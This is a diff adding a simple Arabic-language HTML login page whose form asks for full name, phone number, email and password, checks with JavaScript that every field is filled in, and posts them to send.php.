@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صفحة تسجيل الدخول</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Handjet:wght@300&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="all.css">
+
+    <script>
+        function validateForm() {
+            const fullName = document.querySelector('input[name="full_name"]').value;
+            const phoneNumber = document.querySelector('input[name="phone_number"]').value;
+            const email = document.querySelector('input[name="email"]').value;
+            const password = document.querySelector('input[name="password"]').value;
+
+            if (fullName === "" || phoneNumber === "" || email === "" || password === "") {
+                alert("الرجاء ملء جميع الحقول قبل الإرسال.");
+                return false; // يمنع إرسال النموذج
+            }
+
+            return true; // يسمح بإرسال النموذج إذا تم ملؤه بشكل صحيح
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="logo">
+                <img src="imges/Picsart_23-09-22_11-51-39-445.png" alt="شعار الموقع">
+            </div>
+
+            <form action="send.php" method="post" onsubmit="return validateForm()">            
+                <input type="text" name="full_name" placeholder="اسمك الكامل">
+                <input type="number" name="phone_number" placeholder="ادخل رقمك للتواصل">
+                <input type="email" name="email" id="email" placeholder="البريد الإلكتروني">
+                <input type="password" name="password" placeholder="كلمة المرور"><br>
+                <input type="submit" value="تسجيل الدخول" name="submit">
+            </form>
+            <p class="register-link">هل أنت مسجل سابقا؟ <a class="new" href="login.php">سجل الدخول</a></p>
+        </div>
+    </div>
+</body>
+</html>
